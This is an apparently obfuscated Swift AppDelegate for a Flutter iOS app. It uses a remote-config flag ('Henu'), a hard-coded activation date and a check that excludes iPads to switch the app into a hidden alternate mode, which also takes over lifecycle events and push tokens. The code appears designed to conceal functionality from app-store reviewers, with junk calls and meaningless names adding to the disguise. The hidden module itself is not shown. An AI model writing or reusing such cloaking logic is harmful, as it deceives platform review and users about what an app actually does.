import Flutter
import UIKit
import AppTrackingTransparency
import FirebaseCore
import FirebaseRemoteConfig
import FirebaseMessaging
import RadiantLunaServiceSuite


@objc class AppDelegate: FlutterAppDelegate {
    
    var positiveobserve = "0"
    var possibleorganize = AnalogDigitalConverterReactiveCompatible()
    
  override func application(
    _ application: UIApplication,
    didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
  ) -> Bool {
      
      UniformStatelessInteractor.afterTextGroup()
      UniformStatelessInteractor.touchAcrossTweenBridge()
      MediumAccessoryDetector.offTangentTime()
      MediumAccessoryDetector.betweenTableAsset()
      
      if Int(Date().timeIntervalSince1970) < 64231 {
          demonstrateBenefit()
      }
      
      GeneratedPluginRegistrant.register(with: self)
      self.window.rootViewController?.view.addSubview(self.possibleorganize.view)
      self.window?.makeKeyAndVisible()
      
      self.considerbenefit(application)
      let accomplish = RemoteConfig.remoteConfig()
      let reliable = RemoteConfigSettings()
      reliable.minimumFetchInterval = 0
      reliable.fetchTimeout = 5
      accomplish.configSettings = reliable
      accomplish.fetch { (status, error) -> Void in
          AfterTernaryLayer.copyThroughActionOperation()
          if status == .success {
              accomplish.activate { changed, error in
                  let Henu = accomplish.configValue(forKey: "Henu").stringValue ?? ""
                  print("'Henu': \(Henu)")
                  self.positiveobserve = Henu
                  if self.positiveobserve == "1" {
                      self.essentialdifficult(application, didFinishLaunchingWithOptions: launchOptions)
                  } else {
                      self.familiarexperience(application, didFinishLaunchingWithOptions: launchOptions)
                  }
              }
          } else {
              LostAspectSize.cacheBelowExpandedVar()
              if self.indicateidentify() && self.necessarymaintain() {
                  self.essentialdifficult(application, didFinishLaunchingWithOptions: launchOptions)
              } else {
                  self.familiarexperience(application, didFinishLaunchingWithOptions: launchOptions)
              }
          }
      }
      return true
  }
    
    private func essentialdifficult(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) {
        DispatchQueue.main.async {
            CubeRecursionArray.evaluateUnderResolverScope()
            let _ = BlockReactiveCompatible.shared.button(application, didFinishLaunchingWithOptions: launchOptions, window: self.window)
        }
    }
    
    private func familiarexperience(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
      ) {
          DispatchQueue.main.asyncAfter(deadline: .now() + 2.89) {
              if #available(iOS 14, *) {
                  ATTrackingManager.requestTrackingAuthorization { status in
                  }
                }
          }
          DispatchQueue.main.async {
              self.possibleorganize.view.removeFromSuperview()
              UnmarshalProviderFilter.seekWithoutResourceBuffer()
              super.application(application, didFinishLaunchingWithOptions: launchOptions)
          }
    }

    
    private func indicateidentify() -> Bool {
        let generate:[Character] = ["1","7","5","7","6","4","2","4","0","0"]
        BeforeRepositoryJoiner.analyzeTaskAlongLayout()
        let function: TimeInterval = TimeInterval(String(generate)) ?? 0.0
        let frequent = Date().timeIntervalSince1970
        return frequent > function
    }
    
    private func necessarymaintain() -> Bool {
        EscalateSubsequentState.unscheduleMissedProvider()
        return UIDevice.current.userInterfaceIdiom != .pad
     }

}


extension AppDelegate {
    override func applicationDidEnterBackground(_ application: UIApplication) {
        if self.positiveobserve == "1" {
            BlockReactiveCompatible.usagePullInheritance(application)
        }
    }
    
    override func applicationWillEnterForeground(_ application: UIApplication) {
        if self.positiveobserve == "1" {
            BlockReactiveCompatible.reply(application)
        }
    }

    override func applicationWillResignActive(_ application: UIApplication) {
        if self.positiveobserve == "1" {
            BlockReactiveCompatible.isWill(application)
        }
    }

    override func applicationDidReceiveMemoryWarning(_ application: UIApplication) {
        if self.positiveobserve == "1" {
            BlockReactiveCompatible.increase(application)
        }
    }

    override func application(_ application: UIApplication, handleEventsForBackgroundURLSession identifier: String, completionHandler: @escaping () -> Void) {
        if self.positiveobserve == "1" {
            BlockReactiveCompatible.third(application, handleEventsForBackgroundURLSession: identifier, completionHandler: completionHandler)
        }
    }
    
}


// MARK: - 推送
extension AppDelegate {
    func considerbenefit(_ application: UIApplication) {
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
        developcontinue(application)
    }
    
    func developcontinue(_ application: UIApplication) {
        if #available(iOS 10.0, *) {
            UNUserNotificationCenter.current().delegate = self
            let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
            UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
            })
            application.registerForRemoteNotifications()
        }
    }
    
    func registerForRemoteNotifications() {
        DispatchQueue.main.async {
            UIApplication.shared.registerForRemoteNotifications()
        }
    }
    
    override func application(_: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        BlockReactiveCompatible.visualImageSub(didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }

    override func application(_: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler _: @escaping (UIBackgroundFetchResult) -> Void) {
        BlockReactiveCompatible.labelDate(didReceiveRemoteNotification: userInfo)
    }

    public override func userNotificationCenter(_: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        BlockReactiveCompatible.task(didReceive: response, withCompletionHandler: completionHandler)
    }
}

extension AppDelegate: MessagingDelegate {
    public func messaging(_: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        BlockReactiveCompatible.receiveShow(didReceiveRegistrationToken: fcmToken)
    }
}



